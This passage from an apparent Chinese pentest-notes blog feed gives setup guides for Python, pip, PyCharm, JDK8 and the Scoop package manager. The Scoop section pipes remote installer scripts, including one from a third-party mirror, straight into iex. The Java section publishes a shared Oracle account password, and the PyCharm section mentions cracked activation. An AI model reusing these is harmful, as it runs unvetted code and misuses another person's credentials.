href="https://blog.csdn.net/qq_33547191/article/details/86552214">https://blog.csdn.net/qq_33547191/article/details/86552214</a></p></blockquote><h2 id="安装Python2"><a href="#安装Python2" class="headerlink" title="安装Python2"></a>安装Python2</h2><p>一般Linux系统默认安装Python2.7，因此无需额外安装</p><h2 id="安装Python3"><a href="#安装Python3" class="headerlink" title="安装Python3"></a>安装Python3</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> -p /usr/local/python3</span><br><span class="line">yum -y install wget gcc libffi-devel</span><br><span class="line">wget https://www.python.org/ftp/python/3.7.7/Python-3.7.7.tgz</span><br><span class="line">tar -zxf Python-3.7.7.tgz</span><br><span class="line"><span class="built_in">cd</span> Python-3.7.7</span><br><span class="line">./configure --prefix=/usr/local/python3</span><br><span class="line">make &amp;&amp; make install</span><br></pre></td></tr></table></figure><p>修改PATH环境变量</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">ln</span> -s /usr/local/python3/bin/python3 /usr/bin/python3</span><br><span class="line">yum –y install python3-pip</span><br><span class="line">将/usr/local/python3/bin加入PATH：</span><br><span class="line">vim /etc/profile</span><br><span class="line">PATH=<span class="variable">$PATH</span>:/usr/local/python3/bin</span><br></pre></td></tr></table></figure><p>python3默认版本</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vi /etc/profile.d/python.sh           <span class="comment">#编辑用户自定义配置，输入alias参数</span></span><br><span class="line"><span class="built_in">alias</span> python=<span class="string">&#x27;/usr/local/bin/python3.8&#x27;</span>    <span class="comment">#这里写你的python路径</span></span><br><span class="line"><span class="built_in">source</span> /etc/profile.d/python.sh         <span class="comment">#重启会话使配置生效</span></span><br></pre></td></tr></table></figure><h1 id="Mac安装Python2-x2F-3"><a href="#Mac安装Python2-x2F-3" class="headerlink" title="Mac安装Python2&#x2F;3"></a>Mac安装Python2&#x2F;3</h1><p>系统默认安装Python2.7，因此无需额外安装</p><h2 id="安装Python3-1"><a href="#安装Python3-1" class="headerlink" title="安装Python3"></a>安装Python3</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">brew install python3</span><br></pre></td></tr></table></figure><h2 id="不同版本Python路径"><a href="#不同版本Python路径" class="headerlink" title="不同版本Python路径"></a>不同版本Python路径</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">系统默认(2.7)：</span><br><span class="line">/System/Library/Frameworks/Python.framework/Versions/2.7</span><br><span class="line">brew安装(2.7/3.x)：</span><br><span class="line">/usr/local/Cellar/python</span><br><span class="line">官网pkg安装(3.x)</span><br><span class="line">/Library/Frameworks/Python.framework/Versions/3.x</span><br></pre></td></tr></table></figure><h2 id="配置Python2和Python3"><a href="#配置Python2和Python3" class="headerlink" title="配置Python2和Python3"></a>配置Python2和Python3</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim ~/.bash_profile</span><br><span class="line"># Setting PATH for Python 2.7</span><br><span class="line">PATH=&quot;/System/Library/Frameworks/Python.framework/Versions/2.7/bin:$&#123;PATH&#125;&quot;</span><br><span class="line">export PATH</span><br><span class="line"># Setting PATH for Python 3.x</span><br><span class="line">PATH=&quot;/usr/local/Cellar/python/3.x/bin:$&#123;PATH&#125;&quot;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim ~/.bashrc</span><br><span class="line">alias python2=&#x27;/System/Library/Frameworks/Python.framework/Versions/2.7/bin/python2.7&#x27;</span><br><span class="line">alias python3=&#x27;/usr/local/Cellar/python/3.x/bin/python3.x&#x27;</span><br><span class="line">source ~/.bash_profile</span><br><span class="line">source ~/.bashrc</span><br></pre></td></tr></table></figure><h1 id="安装pip"><a href="#安装pip" class="headerlink" title="安装pip"></a>安装pip</h1><h2 id="pip简介"><a href="#pip简介" class="headerlink" title="pip简介"></a>pip简介</h2><p>pip 是一个 Python 包安装与管理工具。Kali2022 默认安装 python2.7 和 python3. 9 ，但需自行配置 pip</p><p>python pip各版本的安装，最好用脚本下载，</p><p>pip 是一个现代的，通用的 Python 包管理工具。提供了对 Python 包的安装、卸载和查看的功能。注意是安装到windows系统里面</p><h2 id="apt安装方式"><a href="#apt安装方式" class="headerlink" title="apt安装方式"></a>apt安装方式</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apt install python3-pip </span><br><span class="line">apt install python-pip</span><br></pre></td></tr></table></figure><h2 id="脚本下载安装方式"><a href="#脚本下载安装方式" class="headerlink" title="脚本下载安装方式"></a>脚本下载安装方式</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#pip3 清华源下载</span></span><br><span class="line">wget https://bootstrap.pypa.io/get-pip.py   </span><br><span class="line">python get-pip.py -i https://pypi.tuna.tsinghua.edu.cn/simple/</span><br><span class="line"></span><br><span class="line"><span class="comment">#pip2：</span></span><br><span class="line">curl https://bootstrap.pypa.io/pip/2.7/get-pip.py -o get-pip2.py</span><br><span class="line">python2 get-pip2.py</span><br><span class="line"></span><br><span class="line"><span class="comment">#pip3：</span></span><br><span class="line">curl https://bootstrap.pypa.io/get-pip.py -o get-pip3.py</span><br><span class="line">python3 get-pip3.py &amp; pip3 list</span><br></pre></td></tr></table></figure><h2 id="pip安装-Python-库"><a href="#pip安装-Python-库" class="headerlink" title="pip安装 Python 库"></a>pip安装 Python 库</h2><blockquote><p>一般python-pip安装的库，都在<code>\Lib\site-packages</code>目录下</p><p>比如<code>D:\Program Files (x86)\python3.10\Lib\site-packages\</code></p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo pip3 install pwntools</span><br><span class="line">pip使用国内代理：</span><br><span class="line">pip3 install -r requirements.txt -i https://mirrors.ustc.edu.cn/pypi/web/simple</span><br></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment">#安装库和卸载库(了解)</span></span><br><span class="line"><span class="comment">#查看库</span></span><br><span class="line">pip list</span><br><span class="line"><span class="comment">#安装库</span></span><br><span class="line">pip install requests</span><br><span class="line"><span class="comment">#卸载库</span></span><br><span class="line">pip uninstall requests</span><br><span class="line"><span class="comment">#在python解释器里面导入库，导入库(没有安装库是无法导入的)</span></span><br><span class="line">import requests</span><br></pre></td></tr></table></figure><h1 id="Pycharm"><a href="#Pycharm" class="headerlink" title="Pycharm"></a>Pycharm</h1><h2 id="安装过程"><a href="#安装过程" class="headerlink" title="安装过程"></a>安装过程</h2><blockquote><p>简单</p><p>激活的话，2018、2020图灵课程就破解，2022新版就学生特权激活即可~</p></blockquote><h2 id="Pycharm使用"><a href="#Pycharm使用" class="headerlink" title="Pycharm使用"></a>Pycharm使用</h2><ol><li><p>pycharm项目需要设置两个东西，一个是代码路径，一个是解释器路径</p></li><li><p>设置-编辑器-配色方案修改代码高亮类型</p></li><li><p>修改注释颜色：</p></li></ol><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209281422711.png" alt="image-20220928142254470"></p><h2 id="Pycharm常用快捷键"><a href="#Pycharm常用快捷键" class="headerlink" title="Pycharm常用快捷键"></a>Pycharm常用快捷键</h2><blockquote><p>pycharm支持的快捷键方案有很多种，在<strong>file-&gt;sitting-&gt;Keymap</strong>中可以进行选择</p></blockquote><h3 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Ctrl + Q  快速查看文档</span><br><span class="line">Ctrl + 鼠标左键 简介及代码定义</span><br><span class="line">Ctrl + F1  显示错误描述或警告信息</span><br><span class="line">Ctrl + /  行注释/取消注释（可选中多行）</span><br><span class="line">Ctrl + Alt + L  代码格式化</span><br><span class="line">Ctrl + Alt + O  自动导入包</span><br><span class="line">Tab / Shift + Tab  缩进/取消缩进（可选中多行）</span><br><span class="line">Ctrl + D  复制选定的区域（一行或多行）</span><br><span class="line">Ctrl + Y  删除当前行</span><br><span class="line">Shift + Enter  任意位置换行</span><br><span class="line">Ctrl + Shift +/-  展开/折叠全部代码块</span><br><span class="line">Ctrl + Shift + F7  将当前单词在整个文件中高亮，F3移动到下一个，ESC取消高亮。</span><br><span class="line">双击Shift  快速查找</span><br><span class="line">Alt + Enter  智能语法提示</span><br><span class="line">Alt + Shift + up/down  当前行上移或下移动</span><br><span class="line">Ctrl + Delete  删除到字符结束</span><br><span class="line">Shift + F6  方法或变量重命名</span><br><span class="line">Ctrl + Alt + 空格  代码补全</span><br><span class="line">Shift + F10  运行程序</span><br><span class="line">Shift + F9 调试程序（debug模式）</span><br><span class="line">F8  单步执行</span><br><span class="line">ctrl + 向上 放大字体</span><br><span class="line">shift + 滚轮，左右滚动代码</span><br></pre></td></tr></table></figure><blockquote><p>pycharm写Html时候的快捷键</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入！直接tab可以快速生成快捷键</span><br><span class="line">输入标签名如image按tab快速生成一对标签</span><br></pre></td></tr></table></figure><h1 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h1><ul><li>python site-packages目录：</li></ul><p>python第三方包都安装到了site-packages目录下了。 我们可以通过下面的python代码来找到它的位置：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line">os.path.dirname(os.__file__)</span><br></pre></td></tr></table></figure><ul><li>python安装第三方包的安装路径，dist-packages和site-packages区别：</li></ul><p>简单来说便是，如果是系统自带的python，会使用dist-packages目录；如果你手动安装python，它会直接使用目录site-packages。</p><blockquote><p>参考：<a href="https://blog.csdn.net/cc1949/article/details/78286224">https://blog.csdn.net/cc1949/article/details/78286224</a></p></blockquote><ul><li>pip、pip2和pip3区别：</li></ul><p>pip和pip2相同，均对应Python2.x版本。pip3对应Python3.x版本。</p><p>对应版本下载对应版本的模块</p><blockquote><p>参考：<a href="http://www.javashuo.com/article/p-snbrspvb-my.html">http://www.javashuo.com/article/p-snbrspvb-my.html</a></p></blockquote><ul><li>多个python版本共存问题</li></ul><blockquote><p>需要注意到环境变量是从前往后执行的~~~</p></blockquote><p>python安装时，注意到环境变量path的配置是为了在命令行可以直接使用相关的.exe文件，</p><p>我们将python2.7和python3.8，目录都引入path中，再将两个目录下的python.exe，更名为python2.exe和python3.exe，这样在cmd中使用python时，不会冲突</p><p>如果希望使用python而不想输入python3，只需要将python3在安装目录将exe可执行文件复制两份，一份python.exe，一份python3.exe，这样子的话，我们使用python3和python都是唤醒python3啦！！！</p><p>另外需要修改在Windows起始栏的快捷位置：</p><p>注意目标位置和起始位置：这些都是要修改的，我只修改了python3的，因为python idle用python3来执行。如果要用python2，用命令行来执行</p><p>起始位置：”D:\Program Files (x86)\python3.8”</p><p>目标：”D:\Program Files (x86)\python3.8\pythonw.exe” “D:\Program Files (x86)\python3.8\Lib\idlelib\idle.pyw”</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208180122330.png" alt="image-20220818012259063" style="zoom: 33%;" /><p>关于python2，因为其是以msi形式安装的，很难去修改路径，出了很多问题，所以改python.exe安装</p><p>艹了，妈的，python2和3都重装！！</p><ul><li>讲到Linux基础，我归纳入Linux学习部分</li><li>python3.8版本降低至3.6，怎么合理选择自己想要的python版本，怎么设置！？？</li></ul><blockquote><p><a href="https://blog.csdn.net/weixin_42919435/article/details/109523985">https://blog.csdn.net/weixin_42919435/article/details/109523985</a></p></blockquote><h1 id="refer"><a href="#refer" class="headerlink" title="refer"></a>refer</h1><blockquote><p><a href="https://cloud.tencent.com/developer/article/1739012">PyCharm快捷键大全（windows+mac）</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 工具+环境 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Java环境安装</title>
      <link href="/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%B7%A5%E5%85%B7+%E7%8E%AF%E5%A2%83/Java%E7%8E%AF%E5%A2%83%E5%AE%89%E8%A3%85.html"/>
      <url>/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%B7%A5%E5%85%B7+%E7%8E%AF%E5%A2%83/Java%E7%8E%AF%E5%A2%83%E5%AE%89%E8%A3%85.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="注意点"><a href="#注意点" class="headerlink" title="注意点"></a>注意点</h1><ul><li>java安装时，jdk和jre尽量不在同一个目录</li><li>关于jdk8以上版本的jdk，jre文件夹是运行Java程序必不可少的运行环境，比如我们在玩Java版的Minecraft时就必须配置jre的路径。通常我们给用户使用的Java程序中都需要有jre来运行，我们自己做小项目时也是需要jre的。不走运的是新版本的jdk中似乎没有jre的存在，这是因为在Java8之后在安装jdk时便不再提供jre的安装，而是让我们根据自己的需要自行的安装，接下来我会展示如何自己安装jre文件夹（以Java11为例）。</li></ul><blockquote><p>原文链接：<a href="https://blog.csdn.net/qq_41219157/article/details/109667631">https://blog.csdn.net/qq_41219157/article/details/109667631</a></p></blockquote><h1 id="Windows安装JDK8"><a href="#Windows安装JDK8" class="headerlink" title="Windows安装JDK8"></a>Windows安装JDK8</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">通过scoop安装</span><br><span class="line">scoop添加官方镜像源（如添加不成功可使用代理方式）</span><br><span class="line">1、通过命令 scoop bucket known 查看官方镜像</span><br><span class="line">2、添加官方包源 scoop bucket add java</span><br><span class="line">3、查看添加成功的源 scoop bucket list</span><br><span class="line">通过scoop安装 </span><br><span class="line">1、通过scoop搜索jdk scoop search jdk8</span><br><span class="line">2、选择对于版本进行下载安装</span><br><span class="line">3、验证安装</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">手动安装</span><br><span class="line">下载 JDK8</span><br><span class="line">https://www.oracle.com/java/technologies/javase-jdk8-downloads.html</span><br><span class="line">账号密码：https://blog.csdn.net/Virgil_K2017/article/details/90260880</span><br><span class="line">账号： liwei@xiaostudy.com </span><br><span class="line">密码： OracleTest1234</span><br><span class="line">安装 JDK8</span><br><span class="line">配置 PATH  环境变量</span><br><span class="line">Win + R  快捷键打开运行窗口，输入 sysdm.cpl  打开系统属性，选择高级，环境变量</span><br><span class="line"> </span><br><span class="line">新建如下环境变量及值：</span><br><span class="line">变量：Java_Home</span><br><span class="line">值：C:\Program Files\Java</span><br><span class="line"> </span><br><span class="line">变量：CLASSPATH</span><br><span class="line">值：.;%Java_Home%\jdk1.8.0_321\bin;%Java_Home%\jdk1.8.0_321\lib\dt.jar;%Java_Home%\jdk1.8.0_321\lib\tools.jar</span><br><span class="line"></span><br><span class="line">变量：Path</span><br><span class="line">值：%Java_Home%\jdk1.8.0_321\bin</span><br><span class="line">    %Java_Home%\jre1.8.0_321\bin</span><br><span class="line">验证安装</span><br><span class="line">Win + R  运行窗口输入 cmd  打开命令提示符，输入 java -version 、 javac -version</span><br></pre></td></tr></table></figure><h1 id="Linux安装JDK8"><a href="#Linux安装JDK8" class="headerlink" title="Linux安装JDK8"></a>Linux安装JDK8</h1><ol><li>切换linux java及javac版本：</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">切换java：</span><br><span class="line">update-alternatives --config java</span><br><span class="line">切换javac：</span><br><span class="line">update-alternatives --config javac</span><br></pre></td></tr></table></figure><blockquote><p><a href="https://blog.xsot.cn/archives/illegalreflective.html">https://blog.xsot.cn/archives/illegalreflective.html</a></p></blockquote><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">包管理器安装（新手推荐）：</span><br><span class="line"><span class="comment"># centos、redhat等</span></span><br><span class="line">yum -y list java*</span><br><span class="line">yum install java-1.8.0-openjdk* -y</span><br><span class="line"></span><br><span class="line"><span class="comment"># debian、ubuntu、kali等</span></span><br><span class="line">apt-cache search java | grep jdk</span><br><span class="line">apt install openjdk-8-jre-headless</span><br><span class="line">apt install openjdk-8-jdk-headless</span><br><span class="line">apt install openjdk-11-jdk</span><br><span class="line"></span><br><span class="line">源码安装（新手不推荐）：</span><br><span class="line">mdkir /usr/java</span><br><span class="line"><span class="built_in">cd</span> /usr/java</span><br><span class="line">tar -zxvf jdk-8u241-linux-x64.tar.gz</span><br><span class="line"><span class="built_in">mv</span> jdk-1.8._241 jdk8</span><br><span class="line">vim /etc/profile    <span class="comment"># 编辑profile配置文件，添加如下内容</span></span><br><span class="line"><span class="built_in">export</span> JAVA_HOME=/usr/java/jdk8</span><br><span class="line"><span class="built_in">export</span> JRE_HOME=<span class="variable">$&#123;JAVA_HOME&#125;</span>/jre</span><br><span class="line"><span class="built_in">export</span> CLASSPATH=.:<span class="variable">$&#123;JAVA_HOME&#125;</span>/lib:<span class="variable">$&#123;JRE_HOME&#125;</span>/lib:<span class="variable">$CLASSPATH</span></span><br><span class="line"><span class="built_in">export</span> JAVA_PATH=<span class="variable">$&#123;JAVA_HOME&#125;</span>/bin:<span class="variable">$&#123;JRE_HOME&#125;</span>/bin</span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$PATH</span>:<span class="variable">$&#123;JAVA_PATH&#125;</span></span><br><span class="line"></span><br><span class="line">验证安装：</span><br><span class="line"><span class="built_in">source</span> /etc/profile        <span class="comment">#让配置生效</span></span><br><span class="line">java --version</span><br></pre></td></tr></table></figure><h1 id="Mac安装JDK8"><a href="#Mac安装JDK8" class="headerlink" title="Mac安装JDK8"></a>Mac安装JDK8</h1><blockquote><p>Java Downloads | Oracle: <a href="https://www.oracle.com/java/technologies/downloads/#java8-mac">https://www.oracle.com/java/technologies/downloads/#java8-mac</a></p></blockquote><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> ~</span><br><span class="line">vim  .bash_profile</span><br><span class="line"><span class="built_in">export</span> </span><br><span class="line">JAVA_HOME=/Library/Java/JavaVirtualMachines/jdk1.8.0_201.jdk/Contents/Home/(java安装目录)</span><br><span class="line"><span class="built_in">source</span> .bash_profile</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 工具+环境 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java安装 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>scoop 包管理器</title>
      <link href="/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%B7%A5%E5%85%B7+%E7%8E%AF%E5%A2%83/scoop-%E5%8C%85%E7%AE%A1%E7%90%86%E5%99%A8.html"/>
      <url>/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%B7%A5%E5%85%B7+%E7%8E%AF%E5%A2%83/scoop-%E5%8C%85%E7%AE%A1%E7%90%86%E5%99%A8.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="Scoop简介"><a href="#Scoop简介" class="headerlink" title="Scoop简介"></a>Scoop简介</h1><blockquote><p>更多信息查看官网：<a href="https://scoop.sh/">https://scoop.sh</a></p></blockquote><p>Windows命令行包管理工具</p><ul><li>命令行安装软件</li><li>命令行管理软件</li><li>自动配置环境变量</li><li>自动管理程序依赖</li></ul><h1 id="Scoop安装"><a href="#Scoop安装" class="headerlink" title="Scoop安装"></a>Scoop安装</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. 在 PowerShell 中打开远程权限</span><br><span class="line">Set-ExecutionPolicy RemoteSigned -scope CurrentUser;</span><br><span class="line">2. 自定义 Scoop 安装目录</span><br><span class="line">$env:SCOOP=&#x27;D:\scoop&#x27;</span><br><span class="line"># 用户环境变量</span><br><span class="line">[Environment]::SetEnvironmentVariable(&#x27;SCOOP&#x27;, $env:SCOOP, &#x27;User&#x27;)</span><br><span class="line"># 系统环境变量</span><br><span class="line"># [Environment]::SetEnvironmentVariable(&#x27;SCOOP_GLOBAL&#x27;, $env:SCOOP_GLOBAL, &#x27;Machine&#x27;)</span><br><span class="line">如果跳过该步骤， Scoop 将默认把所有用户安装的 App 和 Scoop 本身置于 C:\Users\user_name\scoop</span><br><span class="line">3. 下载并安装 Scoop</span><br><span class="line">iwr -useb get.scoop.sh | iex</span><br><span class="line">Initializing...</span><br><span class="line">Downloading...</span><br><span class="line">Extracting...</span><br><span class="line">Creating shim...</span><br><span class="line">Adding D:\scoop\shims to your path.</span><br><span class="line">Scoop was installed successfully!</span><br><span class="line">Type &#x27;scoop help&#x27; for instructions.</span><br><span class="line">scoop update</span><br><span class="line">==+国内镜像</span><br><span class="line">iwr -useb https://gitee.com/glsnames/scoop-installer/raw/master/bin/install.ps1 </span><br><span class="line">| iex</span><br><span class="line">scoop config SCOOP_REPO &#x27;https://gitee.com/glsnames/scoop-installer&#x27;</span><br><span class="line">scoop update</span><br><span class="line">4. 安装软件包</span><br><span class="line">scoop install &lt;app_name&gt;</span><br><span class="line">scoop install sudo</span><br><span class="line">5. 查看 Scoop 使用简介</span><br><span class="line">scoop help</span><br><span class="line">alias       管理 scoop 别名</span><br><span class="line">bucket      管理 Scoop buckets</span><br><span class="line">cache       显示或清除下载缓存</span><br><span class="line">cat         显示指定清单的内容。如果有的话，`bat&#x27;将被用于漂亮地打印JSON。</span><br><span class="line">checkup     检查潜在问题</span><br><span class="line">cleanup     通过删除旧版本清理应用程序</span><br><span class="line">config      获取或设置配置值</span><br><span class="line">create      创建自定义应用程序清单</span><br><span class="line">depends     列出一个应用程序的依赖项</span><br><span class="line">download    下载缓存文件夹中的应用程序并验证哈希值</span><br><span class="line">export      导出（可导入）已安装的应用程序的列表</span><br><span class="line">help        显示一个命令的帮助</span><br><span class="line">hold        按住一个应用程序以禁用更新</span><br><span class="line">home        打开应用程序的主页</span><br><span class="line">info        显示一个应用程序的信息</span><br><span class="line">install     安装应用</span><br><span class="line">list        列出已安装的应用程序</span><br><span class="line">prefix      返回指定应用程序的路径</span><br><span class="line">reset       重置一个应用程序以解决冲突</span><br><span class="line">search      搜索可用的应用程序</span><br><span class="line">shim        操纵Scoop shims</span><br><span class="line">status      显示状态并检查新的应用程序版本</span><br><span class="line">unhold      解除对一个应用程序的控制，使其能够更新</span><br><span class="line">uninstall   卸载一个应用程序</span><br><span class="line">update      新应用程序或Scoop本身</span><br><span class="line">virustotal  在virustotal.com上寻找应用程序的哈希值</span><br><span class="line">which       找到一个shim/executable（类似于Linux上的&#x27;which&#x27;）</span><br></pre></td></tr></table></figure><h1 id="Scoop使用"><a href="#Scoop使用" class="headerlink" title="Scoop使用"></a>Scoop使用</h1><ol><li>添加bucket</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># powershell添加代理</span><br><span class="line">$Env:HTTP_PROXY = &quot;http://127.0.0.1:7890&quot;</span><br><span class="line">$Env:HTTPS_PROXY = &quot;http://127.0.0.1:7890&quot;</span><br><span class="line"># cmd添加代理</span><br><span class="line">set http_proxy = &quot;http://127.0.0.1:7890&quot;</span><br><span class="line">set https_proxy = &quot;http://127.0.0.1:7890&quot;</span><br><span class="line"># 添加 bucket</span><br><span class="line">scoop bucket add main</span><br><span class="line"># 列出添加的 bucket</span><br><span class="line">scoop bucket list</span><br><span class="line">Name Source                                 Updated           Manifests</span><br><span class="line">---- ------                                 -------           ---------</span><br><span class="line">main https://github.com/ScoopInstaller/Main 2022/5/3 20:31:35      1015</span><br><span class="line"># 查看官方推荐的 bucket</span><br><span class="line">scoop bucket known</span><br><span class="line">main</span><br><span class="line">extras</span><br><span class="line">versions</span><br><span class="line">nirsoft</span><br><span class="line">php</span><br><span class="line">nerd-fonts</span><br><span class="line">nonportable</span><br><span class="line">java</span><br><span class="line">games</span><br></pre></td></tr></table></figure><ol start="2"><li>安装应用：以 7zip  为例</li></ol><blockquote><p><a href="https://scoop.sh/#/apps?q=7zip">https://scoop.sh/#/apps?q=7zip</a></p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 搜索 7zip 应用</span><br><span class="line">scoop search 7zip</span><br><span class="line">&#x27;main&#x27; bucket:</span><br><span class="line">    7zip (21.07)</span><br><span class="line">    7zip19.00-helper (19.00)</span><br><span class="line"># 添加 main bucket</span><br><span class="line">scoop bucket add main</span><br><span class="line"># 安装 7zip</span><br><span class="line">scoop install 7zip</span><br><span class="line">Installing &#x27;7zip&#x27; (21.07) [64bit]</span><br><span class="line">7z2107-x64.msi (1.8 MB) </span><br><span class="line">[===============================================================================</span><br><span class="line">======] 100%</span><br><span class="line">Checking hash of 7z2107-x64.msi ... ok.</span><br><span class="line">Extracting 7z2107-x64.msi ... done.</span><br><span class="line">Linking D:\scoop\apps\7zip\current =&gt; D:\scoop\apps\7zip\21.07</span><br><span class="line">Creating shim for &#x27;7z&#x27;.</span><br><span class="line">Creating shortcut for 7-Zip (7zFM.exe)</span><br><span class="line">Persisting Codecs</span><br><span class="line">Persisting Formats</span><br><span class="line">Running post-install script...</span><br><span class="line">&#x27;7zip&#x27; (21.07) was installed successfully!</span><br><span class="line">Notes</span><br><span class="line">-----</span><br><span class="line">Add 7-Zip as a context menu option by running: </span><br><span class="line">&quot;D:\scoop\apps\7zip\current\install-context.reg&quot;</span><br></pre></td></tr></table></figure><ol start="3"><li>查看 scoop 安装的应用</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">scoop list</span><br><span class="line">Installed apps:</span><br><span class="line">Name Version Source Updated             Info</span><br><span class="line">---- ------- ------ -------             ----</span><br><span class="line">7zip 21.07   main   2022-05-03 23:05:15</span><br></pre></td></tr></table></figure><ol start="4"><li>查看应用信息</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">scoop status 7zip</span><br><span class="line">scoop info 7zip</span><br><span class="line">Name        : 7zip</span><br><span class="line">Description : A multi-format file archiver with high compression ratios</span><br><span class="line">Version     : 21.07</span><br><span class="line">Bucket      : main</span><br><span class="line">Website     : https://www.7-zip.org</span><br><span class="line">License     : LGPL-2.1-or-later</span><br><span class="line">Updated at  : 2022/4/4 17:24:43</span><br><span class="line">Updated by  : Issac Lin</span><br><span class="line">Installed   : 21.07</span><br><span class="line">Binaries    : 7z.exe</span><br><span class="line">Shortcuts   : 7-Zip</span><br><span class="line">Notes       : Add 7-Zip as a context menu option by running: &quot;&lt;root&gt;\install-context.reg&quot;</span><br></pre></td></tr></table></figure><ol start="5"><li>Scoop更新应用</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 更新scoop</span><br><span class="line">scoop update</span><br><span class="line"># 更新7zip</span><br><span class="line">scoop update 7zip</span><br><span class="line"># 更新全部</span><br><span class="line">scoop *</span><br></pre></td></tr></table></figure><ol start="6"><li>卸载删除应用</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">scoop uninstall 7zip</span><br><span class="line">Uninstalling &#x27;7zip&#x27; (21.07).</span><br><span class="line">Removing shim &#x27;7z.shim&#x27;.</span><br><span class="line">Removing shim &#x27;7z.exe&#x27;.</span><br><span class="line">Removing shortcut ~\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Scoop Apps\7-Zip.lnk</span><br><span class="line">Unlinking D:\scoop\apps\7zip\current</span><br><span class="line">&#x27;7zip&#x27; was uninstalled.</span><br></pre></td></tr></table></figure><h1 id="Scoop下载加速"><a href="#Scoop下载加速" class="headerlink" title="Scoop下载加速"></a>Scoop下载加速</h1><ol><li>安装 Aria2 来加速下载</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">scoop install aria2</span><br></pre></td></tr></table></figure><ol start="2"><li>如果使用代理，有时需要通过如下命令关闭 aria2</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">scoop config aria2-enabled false</span><br></pre></td></tr></table></figure><ol start="3"><li>aria2 在 Scoop 中默认开启</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">scoop config aria2-enabled true</span><br></pre></td></tr></table></figure><ol start="4"><li>其他参数</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">scoop config aria2-retry-wait 4</span><br><span class="line">scoop config aria2-split 16</span><br><span class="line">scoop config aria2-max-connection-per-server 16</span><br><span class="line">scoop config aria2-min-split-size 4M</span><br></pre></td></tr></table></figure><h1 id="Scoop调用管理员"><a href="#Scoop调用管理员" class="headerlink" title="Scoop调用管理员"></a>Scoop调用管理员</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">scoop install sudo </span><br><span class="line">sudo cmd.exe</span><br></pre></td></tr></table></figure><h1 id="Scoop其他bucket"><a href="#Scoop其他bucket" class="headerlink" title="Scoop其他bucket"></a>Scoop其他bucket</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">scoop bucket add scoopet https://github.com/ivaquero/scoopet.git</span><br><span class="line">scoop update</span><br></pre></td></tr></table></figure><h1 id="Scoop创建安装程序"><a href="#Scoop创建安装程序" class="headerlink" title="Scoop创建安装程序"></a>Scoop创建安装程序</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">scoop create url</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    &quot;version&quot;:  &quot;&quot;,  // 版本</span><br><span class="line">    &quot;license&quot;:  &quot;&quot;,</span><br><span class="line">    &quot;extract_dir&quot;:  &quot;&quot;, // 解压目录</span><br><span class="line">    &quot;url&quot;:  &quot;&quot;,  下载url地址</span><br><span class="line">    &quot;homepage&quot;:  &quot;&quot;,  // 官网主页</span><br><span class="line">    &quot;hash&quot;:  &quot;&quot;,  // 安装文件或压缩包sha256 